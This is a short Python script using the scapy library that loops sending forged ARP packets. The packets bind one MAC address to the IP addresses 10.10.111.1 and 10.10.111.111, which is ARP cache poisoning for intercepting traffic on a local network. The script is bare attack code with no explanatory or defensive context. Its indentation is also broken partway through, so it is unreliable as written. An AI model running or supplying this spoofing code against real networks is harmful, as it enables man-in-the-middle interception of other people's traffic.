#! /usr/bin/python

from scapy.all import  *
def ARPspoofing():

  while(True):
   # send(ARP(op=1,psrc="10.10.111.1",pdst ="10.10.111.107", hwsrc ="02:00:a4:48:02:01"))
   #send(ARP(op=1,psrc="10.10.111.111",pdst ="10.10.111.107", hwsrc ="02:00:a4:48:02:01")) 
    packet = Ether ()/ARP(op="who-has" ,hwsrc="02:00:a4:48:02:01" , psrc ="10.10.111.1" ,pdst ="10.10.111.111")
    sendp(packet)
   # sniff(count =5, filter="arp")
#Sending Gratuitous ARP request
packet = Ether ()/ARP(op="who-has" ,hwsrc="02:00:a4:48:02:01" , psrc ="10.10.111.111" ,pdst="10.10.111.1")
   # sniff(count =5,filter="arp")
    sendp(packet)

if __name__ == "__main__":
    ARPspoofing()


































































